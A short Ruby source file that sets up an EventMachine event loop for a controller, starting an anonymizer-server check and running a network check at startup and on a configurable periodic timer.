require 'rcs-common/trace'
require 'rcs-common/systemstatus'

require_relative 'network'
require_relative 'check_anonymizer_server'

require 'eventmachine'

module RCS
  module Controller
    class Events
      include RCS::Tracer

      def check_interval
        Config.instance.global['NC_INTERVAL']
      end

      def setup
        EM.epoll

        EM::run do
          CheckAnonymizerServer.start

          # first heartbeat and checks (so we don't have to wait 'check_interval' to see the green light on startup)
          EM.defer(proc{ Network.check })

          EM::PeriodicTimer.new(check_interval) { Network.check }
        end
      end
    end
  end
end
